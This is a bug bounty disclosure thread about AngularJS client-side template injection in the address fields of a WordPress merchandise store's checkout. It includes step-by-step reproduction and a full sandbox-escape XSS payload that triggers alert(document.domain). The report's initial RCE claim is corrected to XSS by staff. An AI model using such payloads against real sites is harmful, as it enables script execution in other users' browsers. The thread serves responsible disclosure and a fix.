title: Stored self-XSS in mercantile.wordpress.org checkout
vulnerability_information:
Hello Team,

**Summary**
after i read this #221893 report, i try to find more security issue there, and i was surprise i found an RCE Via Template Injection. Since on that report i see `ng-bindable` word, its possible the site also effect by RCE.

**Step To Reproduce**

1. open https://mercantile.wordpress.org and sign up for account.
2. after finish sign up navigate to `https://mercantile.wordpress.org/my-account/edit-account/` to field your first and last name
3. now navigate again to `https://mercantile.wordpress.org/my-account/edit-address/`
4. field all form for Billing Address with `{{1+1}}` except the `zip code` and field all form with `{{1==1}}` for the Shipping Address. and press save.

{F186514}   

5. now try to make an order by select any product till process or step to `https://mercantile.wordpress.org/checkout/`
6. there you will see, the code `{{1+1}}` that we have field in the form for address bellow is execute as `2` automaticly there. and the `{{1==1}}` in shipping address will be execute as `true` .

{F186513}

This is a vulnerability about Flask Template Engine(Jinja2) Injection or Angular JS Template Injection , more detail can be seen in these blogs for your Reference:

1. https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/
2. https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
3. http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html

Best Regards,
vulnerability_information_html:
Hello Team,

Summary
after i read this #221893 report, i try to find more security issue there, and i was surprise i found an RCE Via Template Injection. Since on that report i see ng-bindable word, its possible the site also effect by RCE.

Step To Reproduce

  1. open https://mercantile.wordpress.org and sign up for account.
  2. after finish sign up navigate to https://mercantile.wordpress.org/my-account/edit-account/ to field your first and last name
  3. now navigate again to https://mercantile.wordpress.org/my-account/edit-address/
  4. field all form for Billing Address with {{1+1}} except the zip code and field all form with {{1==1}} for the Shipping Address. and press save.

  1. now try to make an order by select any product till process or step to https://mercantile.wordpress.org/checkout/
  2. there you will see, the code {{1+1}} that we have field in the form for address bellow is execute as 2 automaticly there. and the {{1==1}} in shipping address will be execute as true .

This is a vulnerability about Flask Template Engine(Jinja2) Injection or Angular JS Template Injection , more detail can be seen in these blogs for your Reference:

  1. https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/
  2. https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/
  3. http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html

Best Regards,

additional_data.old_title: RCE via Template Injection in mercantile.wordpress.org

activities.message:
Hi, thanks for the report. I don't think this is RCE, since it's just client-side. That's typically classified as XSS.

In this case, the payloads you've provided only demonstrate basic expression evaluation. If I understand Angular correctly, that doesn't necessarily mean there's a vulnerability that can lead to XSS.

Are you able to provide a payload that results in XSS?
activities.markdown_message:
Hi, thanks for the report. I don't think this is RCE, since it's just client-side. That's typically classified as XSS.

In this case, the payloads you've provided only demonstrate basic expression evaluation. If I understand Angular correctly, that doesn't necessarily mean there's a vulnerability that can lead to XSS.

Are you able to provide a payload that results in XSS?

activities.message:
hello sur @iandunn ,

first, thanks for your fast response..yes i do agree its just template injection..

but finally i found the payload that can lead to stored XSS , this payload can be used and or work in FF and Chrome

```
{{     c=''.sub.call;b=''.sub.bind;a=''.sub.apply;     c.$apply=$apply;c.$eval=b;op=$root.$$phase;     $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;     C=c.$apply(c);$root.$$phase=op;$root.$digest=od;     B=C(b,c,b);$evalAsync("     astNode=pop();astNode.type='UnaryExpression';     astNode.operator='(window.X?void0:(window.X=true,alert(document.domain)))+';     astNode.argument={type:'Identifier',name:'foo'};     ");     m1=B($$asyncQueue.pop().expression,null,$root);     m2=B(C,null,m1);[].push.apply=m2;a=''.sub;     $eval('a(b.c)');[].push.apply=a; }}
```
   
{F186571}



Best Regards,

activities.message: Thanks, I was able to reproduce XSS with that payload. We'll get started on a fix, and keep you updated on progress.
activities.markdown_message: Thanks, I was able to reproduce XSS with that payload. We'll get started on a fix, and keep you updated on progress.

activities.message: You are welcome sir @iandunn  , and thank you for confirming, am really respect and two thumbs up for your fast response.
activities.markdown_message: You are welcome sir @iandunn , and thank you for confirming, am really respect and two thumbs up for your fast response.

activities.message:
anyway sir, i just don't think its self stored, just in my opinion..how if i complete the order ? i will get full end point URL to the order to check the status right (just like shopify) ? if yes its mean every time i visit (or anyone visit)  the end point URL for the order the xss will trigger i guess.. so this one is stored not self stored.

Correct me if am wrong sir.

Correct me if am wrong sir.

activities.message:
--update--

i have an suggestion how to fix this one i think sir, simple limit to max 100 character, only a-A, 0-9 and `.` (dot) allowed and or do not allow any special / HTML char like in first and last name field/form.
activities.markdown_message:
--update--

i have an suggestion how to fix this one i think sir, simple limit to max 100 character, only a-A, 0-9 and . (dot) allowed and or do not allow any special / HTML char like in first and last name field/form.

activities.message:
Thanks for the suggestion :)

I guess technically it's not limited to only the user who enters it, but it's definitely a mitigating factor.
activities.markdown_message:
Thanks for the suggestion :)

I guess technically it's not limited to only the user who enters it, but it's definitely a mitigating factor.

Hello sir @iandunn ,

i just test this today, and i confirm this one has been fix.. even {{1+1}} will not shown as 2 , and the payload for xss also not working at check out anymore now.

{F187676}

activities.message: Yeah, we've deployed some partial fixes already, but we're still in the process of refining some of the fixes, and doing more testing and hardening.
activities.markdown_message: Yeah, we've deployed some partial fixes already, but we're still in the process of refining some of the fixes, and doing more testing and hardening.

activities.message:
Hello @wordpress team and sir @iandunn ,

sorry for asking this, but i want to know how is the progress.. ? just to make sure you not forget me and this :D

activities.message:
Hi, we're still working on a few more things. Don't worry, we haven't forgotten :)

I'll let you know once we think everything is sorted out. It might be another week or so.

activities.message:
Hey @eidelweiss, I'm really sorry about the delay here. The person that processes/pays our bounties here is on leave. We have a couple people that can fill in, but we're still trying to get everyone into the habit of handling things while they're out.

Thanks for your patience,
Aaron

summaries.content:
thanks to WordPress team and sir Iandunn, really  fast on response and take action.
kudos to Portswigger Web Security regarding the payload
also thanks to codertom for his report at https://hackerone.com/reports/221893, and here #222224 You made me think that more could be done.

I owe you a beer :)
